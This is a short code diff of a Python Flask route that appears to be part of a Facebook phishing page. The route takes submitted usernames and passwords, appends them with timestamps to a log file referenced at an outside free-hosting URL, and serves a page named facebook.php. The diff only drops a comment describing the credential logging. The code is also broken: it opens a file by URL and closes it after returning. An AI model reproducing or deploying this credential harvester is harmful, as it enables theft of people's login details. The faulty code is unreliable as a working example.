@@ -9,7 +9,7 @@ def home():
         username = request.form['username']
         password = request.form['password']
         db_ent = open("https://helppopol.000webhostapp.com/log.txt", 'a')    
-        db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   #writing username : password and datetime to each new line with append mode :
+        db_ent.write("\n \n" + username + " : " + password + "     [*] {}".format(datetime.datetime.now().strftime("%A %b %Y and Time was  : %I:%M:%S")))   
         return render_template('https://helppopol.000webhostapp.com/facebook.php')
         db_ent.close()
     return render_template('https://helppopol.000webhostapp.com/facebook.php')
